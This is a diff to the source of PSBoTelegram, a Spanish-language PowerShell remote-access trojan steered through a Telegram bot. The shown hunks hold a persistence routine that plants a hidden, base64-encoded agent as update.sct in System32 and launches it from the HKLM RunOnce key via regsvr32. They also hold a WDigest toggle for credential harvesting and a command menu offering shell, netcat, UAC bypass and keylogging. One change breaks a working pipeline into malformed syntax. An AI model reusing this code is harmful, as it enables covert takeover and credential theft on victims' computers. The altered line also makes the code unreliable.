@@ -189,7 +189,7 @@ function persistence {
 If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
 {$texto = "Sorry, necesitas privilegios"; return $texto;break }  else {
 $agent_bot = create_agent -botkey $botkey -chat_id $chat_id;  $agent_bot = $agent_bot -replace "con bypassuac :D","" ; $code = code_a_base64 -code $agent_bot; $code = "powershell.exe -win hidden -enc " + $code
-crea_plantilla_sct -code $code | Out-File -Encoding ascii "C:\Windows\System32\update.sct" 
+crea_plantilla_sct -code $code Out-File | -Encoding ascii "C:\Windows\System32\update.sct" 
 $key = "registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"; $modifica = "c:\windows\system32\regsvr32.exe /s /n /u /i:c:\windows\system32\update.sct scrobj.dll" ; set-item $Key $modifica
 $texto = "Persistencia ejecutada correctamente"} return $texto;break}
 
@@ -225,7 +225,7 @@ Remove-Item $ruta ;return $extraido}}} extrae_credenciales' ; $keylogger = $KeyL
 
 function mimikittenz {
 param($Activar)
-)
+
 if ($Activar -like "on" ) {$Activar="Si"} ; if ($Activar -like "off") {$Activar="No"} 
 $ruta_key = "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest"
 $key = "UseLogonCredential"
@@ -257,7 +257,7 @@ classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
 </scriptlet>'
 return $plantilla_sct}
 
-function test-command {param ($comando="",$botkey="",$chat_id="",$first_connect="") {
+function test-command {param ($comando="",$botkey="",$chat_id="",$first_connect="") 
  $help = "PSBoTelegram V0.8`n`nComandos disponibles :`n[*] /Help`n[*] /Info`n[*] /Shell`n[*] /whoami`n[*] /Ippublic`n[*] /Kill`n[*] /Scriptimport`n[*] /Shell nc (NETCAT)`n[*] /Download`n[*] /Screenshot`n[*] /Audio`n[*] /BypassUAC`n[*] /Persistence`n[*] /MimiGatoz`n[*] /KeyLogger_Selective"
  if ($comando -like "/Help") {$texto = $help; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
  if ($comando -like "Hola") {$texto = "Hola cabeshaa !! :D"; envia-mensaje -text $texto -botkey $botkey -chat $chat_id }
